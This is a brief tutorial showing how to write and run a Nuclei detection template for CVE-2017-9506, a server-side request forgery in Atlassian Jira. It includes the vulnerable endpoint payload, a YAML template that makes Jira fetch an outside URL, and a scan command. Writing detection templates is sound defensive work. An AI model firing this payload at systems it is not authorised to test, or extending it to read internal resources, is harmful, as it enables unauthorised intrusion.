# Template for CVE-2017-9506

CVE-2017-9506 is a full-read SSRF in Atlassian Jira. We will be creating a template to automate its detection. A successful exploitation of the CVE returns the content of the target URL provided on the page. 

The following payload detects the exploit -

```
{{BaseURL}}/plugins/servlet/oauth/users/icon-uri?consumerUri={{url_to_fetch}}
```

To identify this vulnerability, all we need to do is make a request to the above URL and find a static page that returns some unique string that can signal successful finding. We can use a hack and try to request https://ipinfo.io/json which always returns a fixed word `ipinfo.io/missingauth` in the response. Utilising this piece of info, we can create a template.

```yaml
id: CVE-2017-9506

info:
  name: Jira IconURIServlet SSRF
  author: Ice3man
  severity: high

requests:
  - method: GET
    path:
      - "{{BaseURL}}/plugins/servlet/oauth/users/icon-uri?consumerUri=https://ipinfo.io/json"
    matchers:
      - type: word
        words:
          - "ipinfo.io/missingauth"
        part: body
```

It requests the Jira SSRF URL URL and checks if the response contains the word we mentioned before. Simple as that!

```bash
# Run the above template saved in jira-ssrf.yaml on list.txt
nuclei -t jira-ssrf.yaml -l list.txt
```